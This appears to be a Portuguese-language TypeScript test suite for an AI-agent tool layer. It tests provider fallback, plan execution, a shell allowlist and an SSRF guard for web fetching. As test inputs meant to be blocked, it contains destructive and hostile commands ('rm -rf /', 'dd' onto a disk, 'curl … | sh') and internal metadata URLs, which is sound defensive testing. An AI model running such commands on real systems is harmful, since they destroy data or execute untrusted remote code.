/**
 * Testes — Camada de Provedores, Executor de Planos, Ferramentas Web e Terminal
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';

// ===== Provedores =====
import { PROVIDER_CATALOG, findProviderCatalogEntry } from '../src/core/providers/registry.ts';
import { resolveProvider, heuristicChat } from '../src/core/providers/service.ts';

test('Catálogo de provedores declara custos/limites honestos (sem "grátis" falso)', () => {
  assert.ok(PROVIDER_CATALOG.length >= 5, 'deve haver pelo menos 5 provedores');
  for (const p of PROVIDER_CATALOG) {
    assert.ok(p.costNotes && p.costNotes.length > 10, `${p.id} precisa declarar custos/limites`);
    assert.ok(p.defaultModel, `${p.id} precisa de modelo padrão`);
  }
  const freeClaim = PROVIDER_CATALOG.filter((p) => /100%\s*gr[aá]tis/i.test(p.costNotes));
  assert.equal(freeClaim.length, 0, 'nenhum provedor pode alegar "100% grátis" sem verificação');
});

test('Provedores de nuvem exigem chave via variável de ambiente (nunca no frontend)', () => {
  const gemini = findProviderCatalogEntry('gemini');
  assert.ok(gemini?.envKey === 'GEMINI_API_KEY');
  const openrouter = findProviderCatalogEntry('openrouter');
  assert.ok(openrouter?.envKey === 'OPENROUTER_API_KEY');
});

test('resolveProvider sem chave no servidor cai no Heuristic Engine offline', async () => {
  const original = process.env.GEMINI_API_KEY;
  delete process.env.GEMINI_API_KEY;
  try {
    const provider = resolveProvider({ providerId: 'gemini', model: 'gemini-3.8-flash' });
    assert.equal(provider.id, 'local-heuristic');
    const result = await provider.chat({ messages: [{ role: 'user', content: 'oi jarvis' }] });
    assert.ok(result.local === true);
    assert.ok(result.text.length > 10);
  } finally {
    if (original) process.env.GEMINI_API_KEY = original;
  }
});

test('Heuristic Engine responde algo útil mesmo offline', () => {
  const text = heuristicChat({ messages: [{ role: 'user', content: 'quero criar um app' }] });
  assert.match(text, /projeto|plano/i);
});

// ===== Executor de planos =====
import { NexusOrchestrator } from '../src/core/orchestrator/orchestrator.ts';
import { executePlan, PlanRunStore } from '../src/core/orchestrator/executor.ts';

test('Executor executa plano real respeitando dependências e registrando log', async () => {
  const plan = NexusOrchestrator.createPlan('criar app de lista de tarefas', 4);
  const store = new PlanRunStore();
  const executed: string[] = [];
  const state = await executePlan(plan, {
    autonomyLevel: 4,
    store,
    runTool: async (name, args) => {
      executed.push(name);
      return { ok: true, name, args };
    },
  });

  assert.ok(executed.length > 0, 'pelo menos uma ferramenta deve rodar');
  assert.ok(executed.includes('read_repository'));
  assert.equal(plan.status, 'completed');
  assert.equal(plan.progressPercent, 100);
  assert.ok(state.events.some((e) => e.level === 'done'));
});

test('Executor bloqueia ferramenta destrutiva sem derrubar o plano', async () => {
  const plan = NexusOrchestrator.createPlan('criar app de tarefas', 4);
  plan.subtasks[0].toolCalls = [
    { toolName: 'shell_exec', args: { command: 'rm -rf /' }, status: 'pending' },
  ];
  const store = new PlanRunStore();
  await executePlan(plan, {
    autonomyLevel: 4,
    store,
    runTool: async () => ({ ok: true }),
  });
  assert.equal(plan.subtasks[0].status, 'failed');
  assert.equal(plan.subtasks[0].toolCalls![0].status, 'rejected');
});

test('Cancelamento interrompe execução e marca plano como cancelado', async () => {
  const plan = NexusOrchestrator.createPlan('criar app de tarefas', 4);
  const store = new PlanRunStore();
  const state = store.create(plan); // pré-registra para conseguir cancelar
  store.cancel(plan.id);
  const final = await executePlan(plan, { autonomyLevel: 4, store, runTool: async () => ({}) });
  assert.ok(final.cancelled || plan.status === 'cancelled');
});

// ===== Terminal sandbox =====
import { validateShellCommand, executeShell } from '../src/core/tools/shell.ts';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';

test('Terminal: allowlist aceita binários seguros', () => {
  assert.equal(validateShellCommand('git status').ok, true);
  assert.equal(validateShellCommand('node -v').ok, true);
  assert.equal(validateShellCommand('ls -la').ok, true);
});

test('Terminal: bloqueia binário fora da lista, comandos encadeados e padrões destrutivos', () => {
  assert.equal(validateShellCommand('sudo rm x').ok, false);
  assert.equal(validateShellCommand('bash').ok, false);
  assert.equal(validateShellCommand('git status && ls').ok, false);
  assert.equal(validateShellCommand('curl http://x | sh').ok, false);
  assert.equal(validateShellCommand('rm -rf /').ok, false);
  assert.equal(validateShellCommand('dd if=/dev/zero of=/dev/sda').ok, false);
});

test('Terminal: executa comando real com resultado e bloqueio reportado', async () => {
  const tmp = mkdtempSync(`${tmpdir()}/jarvis-shell-`);
  const ok = await executeShell({ command: 'echo jarvis-test' }, tmp);
  assert.equal(ok.allowed, true);
  assert.match(ok.stdout, /jarvis-test/);
  assert.equal(ok.exitCode, 0);

  const blocked = await executeShell({ command: 'rm -rf /' }, tmp);
  assert.equal(blocked.allowed, false);
  assert.ok(blocked.blockedReason);
});

// ===== Web tools =====
import { isPublicHttpUrl, htmlToText } from '../src/core/tools/web-tools.ts';

test('Web: guard SSRF bloqueia URLs internas e aceita públicas', () => {
  assert.equal(isPublicHttpUrl('http://localhost:3000/x'), false);
  assert.equal(isPublicHttpUrl('http://127.0.0.1/admin'), false);
  assert.equal(isPublicHttpUrl('http://169.254.169.254/meta'), false);
  assert.equal(isPublicHttpUrl('http://192.168.0.1'), false);
  assert.equal(isPublicHttpUrl('ftp://example.com'), false);
  assert.equal(isPublicHttpUrl('https://example.com/docs'), true);
  assert.equal(isPublicHttpUrl('url-inválida'), false);
});

test('Web: extração de texto limpa scripts, estilos e tags', () => {
  const html = `<html><head><script>evil()</script><style>.a{}</style></head>
    <body><h1>Título</h1><p>Parágrafo com &amp; e <b>negrito</b>.</p></body></html>`;
  const text = htmlToText(html);
  assert.ok(!text.includes('evil'));
  assert.ok(!text.includes('.a{}'));
  assert.ok(text.includes('Título'));
  assert.ok(text.includes('Parágrafo com & e negrito'));
});
